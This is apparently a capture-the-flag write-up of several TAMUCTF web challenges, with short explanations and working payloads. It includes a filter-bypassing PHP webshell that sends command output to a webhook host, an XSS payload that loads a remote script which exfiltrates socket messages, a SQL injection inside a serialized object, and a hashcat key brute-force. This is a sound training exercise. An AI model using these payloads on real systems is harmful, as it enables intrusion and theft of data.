# Web
## Remote
The code checks keywords before filtering. Hence, injecting chracters that will be filtered later would bypass it, like `p hp`. Once uploaded a webshell, `ls /tmp | head -n 1` to enumerate the files in /tmp and find out the flag. Since the server will not respond, I set up a web server to retrieve the response with `file_get_contents`

Final payload to read the flag
```
https://remote.tamuctf.com/uploads/a883ffa3e14ef5a295448894efe2f0fc/gwm2ucz4dxgeyaavxid6kr1z28yk8f22.php?cmd=cat%20/tmp/flag-de88df3ebf2f0c4bf871ddfb2e0fcce4.txt
```

Webshell:
```php
<?php $url='http://webhook/?' . exec($_GET['cmd']);file_get_contents($url);?>
```

## Flipped
CBC Flip attack. Flip the 10th byte

## Forgotten Password
The code checks the email with `include`, which can be tricked with a `\x00`

## Imposter

XSS code:
```HTML
<img src=x onerror=document.body.appendChild(document.createElement('script')).src='//webhook/imposter.js'>
```

JS code on the server:
```JavaScript
socket.on('message', function(data){

var httpRequest = new XMLHttpRequest();
httpRequest.open('POST', 'http://webhook/imposter.php', true);
httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
httpRequest.send('data=from flag message-' + data.content);
httpRequest.onreadystatechange = function () {
    if (httpRequest.readyState == 4 && httpRequest.status == 200) {
        var json = httpRequest.responseText;
        console.log(json);
    }
};

        }
)
socket.emit('flag');
```

PHP code on the server:
```php
<?php
$data = $_POST['data'];

$file = fopen("/tmp/data.txt", "w");

if (fwrite($file, $data)) {
} else {
}

fclose($file);
?>
```

## cereal
Replace the password md5(''). Then it is a regular SQL injection.

```
"username";s:57:"a' union select 1,2,group_concat(password),4 from users--"
"password":"d41d8cd98f00b204e9800998ecf8427e"
```

## cracked
Get the base64 decoded hex of sig. Then brute force the key with hashcat.

```
hashcat -m 150 -a 3 'beefda82f9ed4590ea38e9c5a4616397e19f9c74:{"admin": 0, "username": "guest"}' '?a?a?a?a?a?a'

beefda82f9ed4590ea38e9c5a4616397e19f9c74:{"admin": 0, "username": "guest"}:6lmao9
```
